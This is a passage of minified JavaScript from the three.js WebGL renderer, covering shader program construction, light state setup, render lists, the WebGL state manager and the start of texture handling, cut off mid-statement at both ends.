e.join("\n")}(l),w=s.createProgram();if(n.isRawShaderMaterial?((m=[b].filter(In).join("\n")).length>0&&(m+="\n"),(_=[x,b].filter(In).join("\n")).length>0&&(_+="\n")):(m=["precision "+a.precision+" float;","precision "+a.precision+" int;","#define SHADER_NAME "+r.name,b,a.supportsVertexTextures?"#define VERTEX_TEXTURES":"","#define GAMMA_FACTOR "+y,"#define MAX_BONES "+a.maxBones,a.useFog&&a.fog?"#define USE_FOG":"",a.useFog&&a.fogExp?"#define FOG_EXP2":"",a.map?"#define USE_MAP":"",a.envMap?"#define USE_ENVMAP":"",a.envMap?"#define "+p:"",a.lightMap?"#define USE_LIGHTMAP":"",a.aoMap?"#define USE_AOMAP":"",a.emissiveMap?"#define USE_EMISSIVEMAP":"",a.bumpMap?"#define USE_BUMPMAP":"",a.normalMap?"#define USE_NORMALMAP":"",a.normalMap&&a.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",a.displacementMap&&a.supportsVertexTextures?"#define USE_DISPLACEMENTMAP":"",a.specularMap?"#define USE_SPECULARMAP":"",a.roughnessMap?"#define USE_ROUGHNESSMAP":"",a.metalnessMap?"#define USE_METALNESSMAP":"",a.alphaMap?"#define USE_ALPHAMAP":"",a.vertexTangents?"#define USE_TANGENT":"",a.vertexColors?"#define USE_COLOR":"",a.flatShading?"#define FLAT_SHADED":"",a.skinning?"#define USE_SKINNING":"",a.useVertexTexture?"#define BONE_TEXTURE":"",a.morphTargets?"#define USE_MORPHTARGETS":"",a.morphNormals&&!1===a.flatShading?"#define USE_MORPHNORMALS":"",a.doubleSided?"#define DOUBLE_SIDED":"",a.flipSided?"#define FLIP_SIDED":"",a.shadowMapEnabled?"#define USE_SHADOWMAP":"",a.shadowMapEnabled?"#define "+u:"",a.sizeAttenuation?"#define USE_SIZEATTENUATION":"",a.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",a.logarithmicDepthBuffer&&(o.isWebGL2||e.get("EXT_frag_depth"))?"#define USE_LOGDEPTHBUF_EXT":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_TANGENT","\tattribute vec4 tangent;","#endif","#ifdef USE_COLOR","\tattribute vec3 color;","#endif","#ifdef USE_MORPHTARGETS","\tattribute vec3 morphTarget0;","\tattribute vec3 morphTarget1;","\tattribute vec3 morphTarget2;","\tattribute vec3 morphTarget3;","\t#ifdef USE_MORPHNORMALS","\t\tattribute vec3 morphNormal0;","\t\tattribute vec3 morphNormal1;","\t\tattribute vec3 morphNormal2;","\t\tattribute vec3 morphNormal3;","\t#else","\t\tattribute vec3 morphTarget4;","\t\tattribute vec3 morphTarget5;","\t\tattribute vec3 morphTarget6;","\t\tattribute vec3 morphTarget7;","\t#endif","#endif","#ifdef USE_SKINNING","\tattribute vec4 skinIndex;","\tattribute vec4 skinWeight;","#endif","\n"].filter(In).join("\n"),_=[x,"precision "+a.precision+" float;","precision "+a.precision+" int;","#define SHADER_NAME "+r.name,b,a.alphaTest?"#define ALPHATEST "+a.alphaTest+(a.alphaTest%1?"":".0"):"","#define GAMMA_FACTOR "+y,a.useFog&&a.fog?"#define USE_FOG":"",a.useFog&&a.fogExp?"#define FOG_EXP2":"",a.map?"#define USE_MAP":"",a.matcap?"#define USE_MATCAP":"",a.envMap?"#define USE_ENVMAP":"",a.envMap?"#define "+d:"",a.envMap?"#define "+p:"",a.envMap?"#define "+f:"",a.lightMap?"#define USE_LIGHTMAP":"",a.aoMap?"#define USE_AOMAP":"",a.emissiveMap?"#define USE_EMISSIVEMAP":"",a.bumpMap?"#define USE_BUMPMAP":"",a.normalMap?"#define USE_NORMALMAP":"",a.normalMap&&a.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",a.specularMap?"#define USE_SPECULARMAP":"",a.roughnessMap?"#define USE_ROUGHNESSMAP":"",a.metalnessMap?"#define USE_METALNESSMAP":"",a.alphaMap?"#define USE_ALPHAMAP":"",a.vertexTangents?"#define USE_TANGENT":"",a.vertexColors?"#define USE_COLOR":"",a.gradientMap?"#define USE_GRADIENTMAP":"",a.flatShading?"#define FLAT_SHADED":"",a.doubleSided?"#define DOUBLE_SIDED":"",a.flipSided?"#define FLIP_SIDED":"",a.shadowMapEnabled?"#define USE_SHADOWMAP":"",a.shadowMapEnabled?"#define "+u:"",a.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",a.physicallyCorrectLights?"#define PHYSICALLY_CORRECT_LIGHTS":"",a.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",a.logarithmicDepthBuffer&&(o.isWebGL2||e.get("EXT_frag_depth"))?"#define USE_LOGDEPTHBUF_EXT":"",a.envMap&&(o.isWebGL2||e.get("EXT_shader_texture_lod"))?"#define TEXTURE_LOD_EXT":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;",0!==a.toneMapping?"#define TONE_MAPPING":"",0!==a.toneMapping?ye.tonemapping_pars_fragment:"",0!==a.toneMapping?Rn("toneMapping",a.toneMapping):"",a.dithering?"#define DITHERING":"",a.outputEncoding||a.mapEncoding||a.matcapEncoding||a.envMapEncoding||a.emissiveMapEncoding?ye.encodings_pars_fragment:"",a.mapEncoding?Cn("mapTexelToLinear",a.mapEncoding):"",a.matcapEncoding?Cn("matcapTexelToLinear",a.matcapEncoding):"",a.envMapEncoding?Cn("envMapTexelToLinear",a.envMapEncoding):"",a.emissiveMapEncoding?Cn("emissiveMapTexelToLinear",a.emissiveMapEncoding):"",a.outputEncoding?("linearToOutputTexel",g=a.outputEncoding,v=On(g),"vec4 linearToOutputTexel( vec4 value ) { return LinearTo"+v[0]+v[1]+"; }"):"",a.depthPacking?"#define DEPTH_PACKING "+n.depthPacking:"","\n"].filter(In).join("\n")),c=Nn(c=Fn(c=zn(c),a),a),h=Nn(h=Fn(h=zn(h),a),a),c=Dn(c),h=Dn(h),o.isWebGL2&&!n.isRawShaderMaterial){var T=!1,S=/^\s*#version\s+300\s+es\s*\n/;n.isShaderMaterial&&null!==c.match(S)&&null!==h.match(S)&&(T=!0,c=c.replace(S,""),h=h.replace(S,"")),m=["#version 300 es\n","#define attribute in","#define varying out","#define texture2D texture"].join("\n")+"\n"+m,_=["#version 300 es\n","#define varying in",T?"":"out highp vec4 pc_fragColor;",T?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join("\n")+"\n"+_}var M=m+c,E=_+h,L=An(s,s.VERTEX_SHADER,M),k=An(s,s.FRAGMENT_SHADER,E);s.attachShader(w,L),s.attachShader(w,k),void 0!==n.index0AttributeName?s.bindAttribLocation(w,0,n.index0AttributeName):!0===a.morphTargets&&s.bindAttribLocation(w,0,"position"),s.linkProgram(w);var A,P,O=s.getProgramInfoLog(w).trim(),C=s.getShaderInfoLog(L).trim(),R=s.getShaderInfoLog(k).trim(),I=!0,F=!0;return!1===s.getProgramParameter(w,s.LINK_STATUS)?I=!1:""!==O||""!==C&&""!==R||(F=!1),F&&(this.diagnostics={runnable:I,material:n,programLog:O,vertexShader:{log:C,prefix:m},fragmentShader:{log:R,prefix:_}}),s.deleteShader(L),s.deleteShader(k),this.getUniforms=function(){return void 0===A&&(A=new kn(s,w,t)),A},this.getAttributes=function(){return void 0===P&&(P=function(t,e){for(var i={},n=t.getProgramParameter(e,t.ACTIVE_ATTRIBUTES),r=0;r<n;r++){var a=t.getActiveAttrib(e,r).name;i[a]=t.getAttribLocation(e,a)}return i}(s,w)),P},this.destroy=function(){s.deleteProgram(w),this.program=void 0},Object.defineProperties(this,{uniforms:{get:function(){return this.getUniforms()}},attributes:{get:function(){return this.getAttributes()}}}),this.name=r.name,this.id=Pn++,this.code=i,this.usedTimes=1,this.program=w,this.vertexShader=L,this.fragmentShader=k,this}function Un(t,e,i){var n=[],r={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distanceRGBA",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"phong",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"},a=["precision","supportsVertexTextures","map","mapEncoding","matcap","matcapEncoding","envMap","envMapMode","envMapEncoding","lightMap","aoMap","emissiveMap","emissiveMapEncoding","bumpMap","normalMap","objectSpaceNormalMap","displacementMap","specularMap","roughnessMap","metalnessMap","gradientMap","alphaMap","combine","vertexColors","vertexTangents","fog","useFog","fogExp","flatShading","sizeAttenuation","logarithmicDepthBuffer","skinning","maxBones","useVertexTexture","morphTargets","morphNormals","maxMorphTargets","maxMorphNormals","premultipliedAlpha","numDirLights","numPointLights","numSpotLights","numHemiLights","numRectAreaLights","shadowMapEnabled","shadowMapType","toneMapping","physicallyCorrectLights","alphaTest","doubleSided","flipSided","numClippingPlanes","numClipIntersection","depthPacking","dithering"];function o(t,e){var i;return t?t.isTexture?i=t.encoding:t.isWebGLRenderTarget&&(i=t.texture.encoding):i=$t,i===$t&&e&&(i=3007),i}this.getParameters=function(e,n,a,s,l,c,h){var u=r[e.type],d=h.isSkinnedMesh?function(t){var e=t.skeleton.bones;if(i.floatVertexTextures)return 1024;var n=i.maxVertexUniforms,r=Math.floor((n-20)/4),a=Math.min(r,e.length);return a<e.length?0:a}(h):0,p=i.precision;null!==e.precision&&(p=i.getMaxPrecision(e.precision),e.precision);var f=t.getRenderTarget();return{shaderID:u,precision:p,supportsVertexTextures:i.vertexTextures,outputEncoding:o(f?f.texture:null,t.gammaOutput),map:!!e.map,mapEncoding:o(e.map,t.gammaInput),matcap:!!e.matcap,matcapEncoding:o(e.matcap,t.gammaInput),envMap:!!e.envMap,envMapMode:e.envMap&&e.envMap.mapping,envMapEncoding:o(e.envMap,t.gammaInput),envMapCubeUV:!!e.envMap&&(306===e.envMap.mapping||307===e.envMap.mapping),lightMap:!!e.lightMap,aoMap:!!e.aoMap,emissiveMap:!!e.emissiveMap,emissiveMapEncoding:o(e.emissiveMap,t.gammaInput),bumpMap:!!e.bumpMap,normalMap:!!e.normalMap,objectSpaceNormalMap:1===e.normalMapType,displacementMap:!!e.displacementMap,roughnessMap:!!e.roughnessMap,metalnessMap:!!e.metalnessMap,specularMap:!!e.specularMap,alphaMap:!!e.alphaMap,gradientMap:!!e.gradientMap,combine:e.combine,vertexTangents:e.normalMap&&e.vertexTangents,vertexColors:e.vertexColors,fog:!!s,useFog:e.fog,fogExp:s&&s.isFogExp2,flatShading:e.flatShading,sizeAttenuation:e.sizeAttenuation,logarithmicDepthBuffer:i.logarithmicDepthBuffer,skinning:e.skinning&&d>0,maxBones:d,useVertexTexture:i.floatVertexTextures,morphTargets:e.morphTargets,morphNormals:e.morphNormals,maxMorphTargets:t.maxMorphTargets,maxMorphNormals:t.maxMorphNormals,numDirLights:n.directional.length,numPointLights:n.point.length,numSpotLights:n.spot.length,numRectAreaLights:n.rectArea.length,numHemiLights:n.hemi.length,numClippingPlanes:l,numClipIntersection:c,dithering:e.dithering,shadowMapEnabled:t.shadowMap.enabled&&h.receiveShadow&&a.length>0,shadowMapType:t.shadowMap.type,toneMapping:t.toneMapping,physicallyCorrectLights:t.physicallyCorrectLights,premultipliedAlpha:e.premultipliedAlpha,alphaTest:e.alphaTest,doubleSided:2===e.side,flipSided:1===e.side,depthPacking:void 0!==e.depthPacking&&e.depthPacking}},this.getProgramCode=function(e,i){var n=[];if(i.shaderID?n.push(i.shaderID):(n.push(e.fragmentShader),n.push(e.vertexShader)),void 0!==e.defines)for(var r in e.defines)n.push(r),n.push(e.defines[r]);for(var o=0;o<a.length;o++)n.push(i[a[o]]);return n.push(e.onBeforeCompile.toString()),n.push(t.gammaOutput),n.push(t.gammaFactor),n.join()},this.acquireProgram=function(r,a,o,s){for(var l,c=0,h=n.length;c<h;c++){var u=n[c];if(u.code===s){++(l=u).usedTimes;break}}return void 0===l&&(l=new Gn(t,e,s,r,a,o,i),n.push(l)),l},this.releaseProgram=function(t){if(0==--t.usedTimes){var e=n.indexOf(t);n[e]=n[n.length-1],n.pop(),t.destroy()}},this.programs=n}function Bn(){var t=new WeakMap;return{get:function(e){var i=t.get(e);return void 0===i&&(i={},t.set(e,i)),i},remove:function(e){t.delete(e)},update:function(e,i,n){t.get(e)[i]=n},dispose:function(){t=new WeakMap}}}function jn(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.program&&e.program&&t.program!==e.program?t.program.id-e.program.id:t.material.id!==e.material.id?t.material.id-e.material.id:t.z!==e.z?t.z-e.z:t.id-e.id}function Wn(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.z!==e.z?e.z-t.z:t.id-e.id}function Hn(){var t=[],e=0,i=[],n=[];function r(i,n,r,a,o,s){var l=t[e];return void 0===l?(l={id:i.id,object:i,geometry:n,material:r,program:r.program,groupOrder:a,renderOrder:i.renderOrder,z:o,group:s},t[e]=l):(l.id=i.id,l.object=i,l.geometry=n,l.material=r,l.program=r.program,l.groupOrder=a,l.renderOrder=i.renderOrder,l.z=o,l.group=s),e++,l}return{opaque:i,transparent:n,init:function(){e=0,i.length=0,n.length=0},push:function(t,e,a,o,s,l){var c=r(t,e,a,o,s,l);(!0===a.transparent?n:i).push(c)},unshift:function(t,e,a,o,s,l){var c=r(t,e,a,o,s,l);(!0===a.transparent?n:i).unshift(c)},sort:function(){i.length>1&&i.sort(jn),n.length>1&&n.sort(Wn)}}}function Vn(){var t={};function e(i){var n=i.target;n.removeEventListener("dispose",e),delete t[n.id]}return{get:function(i,n){var r,a=t[i.id];return void 0===a?(r=new Hn,t[i.id]={},t[i.id][n.id]=r,i.addEventListener("dispose",e)):void 0===(r=a[n.id])&&(r=new Hn,a[n.id]=r),r},dispose:function(){t={}}}}function Yn(){var t={};return{get:function(e){if(void 0!==t[e.id])return t[e.id];var i;switch(e.type){case"DirectionalLight":i={direction:new ee,color:new be,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new Jt};break;case"SpotLight":i={position:new ee,direction:new ee,color:new be,distance:0,coneCos:0,penumbraCos:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new Jt};break;case"PointLight":i={position:new ee,color:new be,distance:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new Jt,shadowCameraNear:1,shadowCameraFar:1e3};break;case"HemisphereLight":i={direction:new ee,skyColor:new be,groundColor:new be};break;case"RectAreaLight":i={color:new be,position:new ee,halfWidth:new ee,halfHeight:new ee}}return t[e.id]=i,i}}}var Xn=0;function $n(){var t=new Yn,e={id:Xn++,hash:{stateID:-1,directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,shadowsLength:-1},ambient:[0,0,0],directional:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotShadowMap:[],spotShadowMatrix:[],rectArea:[],point:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[]},i=new ee,n=new Qt,r=new Qt;return{setup:function(a,o,s){for(var l=0,c=0,h=0,u=0,d=0,p=0,f=0,m=0,_=s.matrixWorldInverse,g=0,v=a.length;g<v;g++){var y=a[g],x=y.color,b=y.intensity,w=y.distance,T=y.shadow&&y.shadow.map?y.shadow.map.texture:null;if(y.isAmbientLight)l+=x.r*b,c+=x.g*b,h+=x.b*b;else if(y.isDirectionalLight){if((M=t.get(y)).color.copy(y.color).multiplyScalar(y.intensity),M.direction.setFromMatrixPosition(y.matrixWorld),i.setFromMatrixPosition(y.target.matrixWorld),M.direction.sub(i),M.direction.transformDirection(_),M.shadow=y.castShadow,y.castShadow){var S=y.shadow;M.shadowBias=S.bias,M.shadowRadius=S.radius,M.shadowMapSize=S.mapSize}e.directionalShadowMap[u]=T,e.directionalShadowMatrix[u]=y.shadow.matrix,e.directional[u]=M,u++}else if(y.isSpotLight)(M=t.get(y)).position.setFromMatrixPosition(y.matrixWorld),M.position.applyMatrix4(_),M.color.copy(x).multiplyScalar(b),M.distance=w,M.direction.setFromMatrixPosition(y.matrixWorld),i.setFromMatrixPosition(y.target.matrixWorld),M.direction.sub(i),M.direction.transformDirection(_),M.coneCos=Math.cos(y.angle),M.penumbraCos=Math.cos(y.angle*(1-y.penumbra)),M.decay=y.decay,M.shadow=y.castShadow,y.castShadow&&(S=y.shadow,M.shadowBias=S.bias,M.shadowRadius=S.radius,M.shadowMapSize=S.mapSize),e.spotShadowMap[p]=T,e.spotShadowMatrix[p]=y.shadow.matrix,e.spot[p]=M,p++;else if(y.isRectAreaLight)(M=t.get(y)).color.copy(x).multiplyScalar(b),M.position.setFromMatrixPosition(y.matrixWorld),M.position.applyMatrix4(_),r.identity(),n.copy(y.matrixWorld),n.premultiply(_),r.extractRotation(n),M.halfWidth.set(.5*y.width,0,0),M.halfHeight.set(0,.5*y.height,0),M.halfWidth.applyMatrix4(r),M.halfHeight.applyMatrix4(r),e.rectArea[f]=M,f++;else if(y.isPointLight)(M=t.get(y)).position.setFromMatrixPosition(y.matrixWorld),M.position.applyMatrix4(_),M.color.copy(y.color).multiplyScalar(y.intensity),M.distance=y.distance,M.decay=y.decay,M.shadow=y.castShadow,y.castShadow&&(S=y.shadow,M.shadowBias=S.bias,M.shadowRadius=S.radius,M.shadowMapSize=S.mapSize,M.shadowCameraNear=S.camera.near,M.shadowCameraFar=S.camera.far),e.pointShadowMap[d]=T,e.pointShadowMatrix[d]=y.shadow.matrix,e.point[d]=M,d++;else if(y.isHemisphereLight){var M;(M=t.get(y)).direction.setFromMatrixPosition(y.matrixWorld),M.direction.transformDirection(_),M.direction.normalize(),M.skyColor.copy(y.color).multiplyScalar(b),M.groundColor.copy(y.groundColor).multiplyScalar(b),e.hemi[m]=M,m++}}e.ambient[0]=l,e.ambient[1]=c,e.ambient[2]=h,e.directional.length=u,e.spot.length=p,e.rectArea.length=f,e.point.length=d,e.hemi.length=m,e.hash.stateID=e.id,e.hash.directionalLength=u,e.hash.pointLength=d,e.hash.spotLength=p,e.hash.rectAreaLength=f,e.hash.hemiLength=m,e.hash.shadowsLength=o.length},state:e}}function qn(){var t=new $n,e=[],i=[];return{init:function(){e.length=0,i.length=0},state:{lightsArray:e,shadowsArray:i,lights:t},setupLights:function(n){t.setup(e,i,n)},pushLight:function(t){e.push(t)},pushShadow:function(t){i.push(t)}}}function Zn(){var t={};function e(i){var n=i.target;n.removeEventListener("dispose",e),delete t[n.id]}return{get:function(i,n){var r;return void 0===t[i.id]?(r=new qn,t[i.id]={},t[i.id][n.id]=r,i.addEventListener("dispose",e)):void 0===t[i.id][n.id]?(r=new qn,t[i.id][n.id]=r):r=t[i.id][n.id],r},dispose:function(){t={}}}}function Kn(t,e,i,n){var r=new function(){var e=!1,i=new ke,n=null,r=new ke(0,0,0,0);return{setMask:function(i){n===i||e||(t.colorMask(i,i,i,i),n=i)},setLocked:function(t){e=t},setClear:function(e,n,a,o,s){!0===s&&(e*=o,n*=o,a*=o),i.set(e,n,a,o),!1===r.equals(i)&&(t.clearColor(e,n,a,o),r.copy(i))},reset:function(){e=!1,n=null,r.set(-1,0,0,0)}}},a=new function(){var e=!1,i=null,n=null,r=null;return{setTest:function(e){e?G(t.DEPTH_TEST):U(t.DEPTH_TEST)},setMask:function(n){i===n||e||(t.depthMask(n),i=n)},setFunc:function(e){if(n!==e){if(e)switch(e){case 0:t.depthFunc(t.NEVER);break;case 1:t.depthFunc(t.ALWAYS);break;case 2:t.depthFunc(t.LESS);break;case 3:t.depthFunc(t.LEQUAL);break;case 4:t.depthFunc(t.EQUAL);break;case 5:t.depthFunc(t.GEQUAL);break;case 6:t.depthFunc(t.GREATER);break;case 7:t.depthFunc(t.NOTEQUAL);break;default:t.depthFunc(t.LEQUAL)}else t.depthFunc(t.LEQUAL);n=e}},setLocked:function(t){e=t},setClear:function(e){r!==e&&(t.clearDepth(e),r=e)},reset:function(){e=!1,i=null,n=null,r=null}}},o=new function(){var e=!1,i=null,n=null,r=null,a=null,o=null,s=null,l=null,c=null;return{setTest:function(e){e?G(t.STENCIL_TEST):U(t.STENCIL_TEST)},setMask:function(n){i===n||e||(t.stencilMask(n),i=n)},setFunc:function(e,i,o){n===e&&r===i&&a===o||(t.stencilFunc(e,i,o),n=e,r=i,a=o)},setOp:function(e,i,n){o===e&&s===i&&l===n||(t.stencilOp(e,i,n),o=e,s=i,l=n)},setLocked:function(t){e=t},setClear:function(e){c!==e&&(t.clearStencil(e),c=e)},reset:function(){e=!1,i=null,n=null,r=null,a=null,o=null,s=null,l=null,c=null}}},s=t.getParameter(t.MAX_VERTEX_ATTRIBS),l=new Uint8Array(s),c=new Uint8Array(s),h=new Uint8Array(s),u={},d=null,p=null,f=null,m=null,_=null,g=null,v=null,y=null,x=null,b=null,w=!1,T=null,S=null,M=null,E=null,L=null,k=t.getParameter(t.MAX_COMBINED_TEXTURE_IMAGE_UNITS),A=!1,P=0,O=t.getParameter(t.VERSION);-1!==O.indexOf("WebGL")?(P=parseFloat(/^WebGL\ ([0-9])/.exec(O)[1]),A=P>=1):-1!==O.indexOf("OpenGL ES")&&(P=parseFloat(/^OpenGL\ ES\ ([0-9])/.exec(O)[1]),A=P>=2);var C=null,R={},I=new ke,F=new ke;function N(e,i,n){var r=new Uint8Array(4),a=t.createTexture();t.bindTexture(e,a),t.texParameteri(e,t.TEXTURE_MIN_FILTER,t.NEAREST),t.texParameteri(e,t.TEXTURE_MAG_FILTER,t.NEAREST);for(var o=0;o<n;o++)t.texImage2D(i+o,0,t.RGBA,1,1,0,t.RGBA,t.UNSIGNED_BYTE,r);return a}var z={};function D(i,r){l[i]=1,0===c[i]&&(t.enableVertexAttribArray(i),c[i]=1),h[i]!==r&&((n.isWebGL2?t:e.get("ANGLE_instanced_arrays"))[n.isWebGL2?"vertexAttribDivisor":"vertexAttribDivisorANGLE"](i,r),h[i]=r)}function G(e){!0!==u[e]&&(t.enable(e),u[e]=!0)}function U(e){!1!==u[e]&&(t.disable(e),u[e]=!1)}function B(e,n,r,a,o,s,l,c){if(0!==e){if(f||(G(t.BLEND),f=!0),5===e)o=o||n,s=s||r,l=l||a,n===_&&o===y||(t.blendEquationSeparate(i.convert(n),i.convert(o)),_=n,y=o),r===g&&a===v&&s===x&&l===b||(t.blendFuncSeparate(i.convert(r),i.convert(a),i.convert(s),i.convert(l)),g=r,v=a,x=s,b=l),m=e,w=null;else if(e!==m||c!==w){if(_===Et&&y===Et||(t.blendEquation(t.FUNC_ADD),_=Et,y=Et),c)switch(e){case 1:t.blendFuncSeparate(t.ONE,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA);break;case 2:t.blendFunc(t.ONE,t.ONE);break;case 3:t.blendFuncSeparate(t.ZERO,t.ZERO,t.ONE_MINUS_SRC_COLOR,t.ONE_MINUS_SRC_ALPHA);break;case 4:t.blendFuncSeparate(t.ZERO,t.SRC_COLOR,t.ZERO,t.SRC_ALPHA)}else switch(e){case 1:t.blendFuncSeparate(t.SRC_ALPHA,t.ONE_MINUS_SRC_ALPHA,t.ONE,t.ONE_MINUS_SRC_ALPHA);break;case 2:t.blendFunc(t.SRC_ALPHA,t.ONE);break;case 3:t.blendFunc(t.ZERO,t.ONE_MINUS_SRC_COLOR);break;case 4:t.blendFunc(t.ZERO,t.SRC_COLOR)}g=null,v=null,x=null,b=null,m=e,w=c}}else f&&(U(t.BLEND),f=!1)}function j(e){T!==e&&(e?t.frontFace(t.CW):t.frontFace(t.CCW),T=e)}function W(e){e!==Mt?(G(t.CULL_FACE),e!==S&&(1===e?t.cullFace(t.BACK):2===e?t.cullFace(t.FRONT):t.cullFace(t.FRONT_AND_BACK))):U(t.CULL_FACE),S=e}function H(e,i,n){e?(G(t.POLYGON_OFFSET_FILL),E===i&&L===n||(t.polygonOffset(i,n),E=i,L=n)):U(t.POLYGON_OFFSET_FILL)}function V(e){void 0===e&&(e=t.TEXTURE0+k-1),C!==e&&(t.activeTexture(e),C=e)}return z[t.TEXTURE_2D]=N(t.TEXTURE_2D,t.TEXTURE_2D,1),z[t.TEXTURE_CUBE_MAP]=N(t.TEXTURE_CUBE_MAP,t.TEXTURE_CUBE_MAP_POSITIVE_X,6),r.setClear(0,0,0,1),a.setClear(1),o.setClear(0),G(t.DEPTH_TEST),a.setFunc(3),j(!1),W(1),G(t.CULL_FACE),B(0),{buffers:{color:r,depth:a,stencil:o},initAttributes:function(){for(var t=0,e=l.length;t<e;t++)l[t]=0},enableAttribute:function(t){D(t,0)},enableAttributeAndDivisor:D,disableUnusedAttributes:function(){for(var e=0,i=c.length;e!==i;++e)c[e]!==l[e]&&(t.disableVertexAttribArray(e),c[e]=0)},enable:G,disable:U,getCompressedTextureFormats:function(){if(null===d&&(d=[],e.get("WEBGL_compressed_texture_pvrtc")||e.get("WEBGL_compressed_texture_s3tc")||e.get("WEBGL_compressed_texture_etc1")||e.get("WEBGL_compressed_texture_astc")))for(var i=t.getParameter(t.COMPRESSED_TEXTURE_FORMATS),n=0;n<i.length;n++)d.push(i[n]);return d},useProgram:function(e){return p!==e&&(t.useProgram(e),p=e,!0)},setBlending:B,setMaterial:function(e,i){2===e.side?U(t.CULL_FACE):G(t.CULL_FACE);var n=1===e.side;i&&(n=!n),j(n),1===e.blending&&!1===e.transparent?B(0):B(e.blending,e.blendEquation,e.blendSrc,e.blendDst,e.blendEquationAlpha,e.blendSrcAlpha,e.blendDstAlpha,e.premultipliedAlpha),a.setFunc(e.depthFunc),a.setTest(e.depthTest),a.setMask(e.depthWrite),r.setMask(e.colorWrite),H(e.polygonOffset,e.polygonOffsetFactor,e.polygonOffsetUnits)},setFlipSided:j,setCullFace:W,setLineWidth:function(e){e!==M&&(A&&t.lineWidth(e),M=e)},setPolygonOffset:H,setScissorTest:function(e){e?G(t.SCISSOR_TEST):U(t.SCISSOR_TEST)},activeTexture:V,bindTexture:function(e,i){null===C&&V();var n=R[C];void 0===n&&(n={type:void 0,texture:void 0},R[C]=n),n.type===e&&n.texture===i||(t.bindTexture(e,i||z[e]),n.type=e,n.texture=i)},compressedTexImage2D:function(){try{t.compressedTexImage2D.apply(t,arguments)}catch(t){}},texImage2D:function(){try{t.texImage2D.apply(t,arguments)}catch(t){}},texImage3D:function(){try{t.texImage3D.apply(t,arguments)}catch(t){}},scissor:function(e){!1===I.equals(e)&&(t.scissor(e.x,e.y,e.z,e.w),I.copy(e))},viewport:function(e){!1===F.equals(e)&&(t.viewport(e.x,e.y,e.z,e.w),F.copy(e))},reset:function(){for(var e=0;e<c.length;e++)1===c[e]&&(t.disableVertexAttribArray(e),c[e]=0);u={},d=null,C=null,R={},p=null,m=null,T=null,S=null,r.reset(),a.reset(),o.reset()}}}function Jn(t,e,i,n,r,a,o){var s,l={},c="undefined"!=typeof OffscreenCanvas;function h(t,e){return c?new OffscreenCanvas(t,e):document.createElementNS("http://www.w3.org/1999/xhtml","canvas")}function u(t,e,i,n){var r=1;if((t.width>n||t.height>n)&&(r=n/Math.max(t.width,t.height)),r<1||!0===e){if(t instanceof ImageBitmap||t instanceof HTMLImageElement||t instanceof HTMLCanvasElement){var a=e?Zt.floorPowerOfTwo:Math.floor,o=a(r*t.width),l=a(r*t.height);void 0===s&&(s=h(o,l));var u=i?h(o,l):s;return u.width=o,u.height=l,u.getContext("2d").drawImage(t,0,0,o,l),c?u.transferToImageBitmap():u}return t}return t}function d(t){return Zt.isPowerOfTwo(t.width)&&Zt.isPowerOfTwo(t.height)}function p(t,e){return t.generateMipmaps&&e&&t.minFilter!==Pt&&t.minFilter!==Rt}function f(e,i,r,a){t.generateMipmap(e),n.get(i).__maxMipLevel=Math.log(Math.max(r,a))*Math.LOG2E}function m(i,n){if(!r.isWebGL2)return i;var a=i;return i===t.RED&&(n===t.FLOAT&&(a=t.R32F),n===t.HALF_FLOAT&&(a=t.R16F),n===t.UNSIGNED_BYTE&&(a=t.R8)),i===t.RGB&&(n===t.FLOAT&&(a=t.RGB32F),n===t.HALF_FLOAT&&(a=t.RGB16F),n===t.UNSIGNED_BYTE&&(a=t.RGB8)),i===t.RGBA&&(n===t.FLOAT&&(a=t.RGBA32F),n===t.HALF_FLOAT&&(a=t.RGBA16F),n===t.UNSIGNED_BYTE&&(a=t.RGBA8)),a===t.R16F||a===t.R32F||a===t.RGBA16F||a===t.RGBA32F?e.get("EXT_color_buffer_float"):a===t.RGB16F||t.RGB32F,a}function _(e){return e===Pt||e===Ot||e===Ct?t.NEAREST:t.LINEAR}function g(e){var i=e.target;i.removeEventListener("dispose",g),function(e){var i=n.get(e);void 0!==i.__webglInit&&(t.deleteTexture(i.__webglTexture),n.remove(e))}(i),i.isVideoTexture&&delete l[i.id],o.memory.textures--}function v(e){var i=e.target;i.removeEventListener("dispose",v),function(e){var i=n.get(e),r=n.get(e.texture);if(e){if(void 0!==r.__webglTexture&&t.deleteTexture(r.__webglTexture),e.depthTexture&&e.depthTexture.dispose(),e.isWebGLRenderTargetCube)for(var 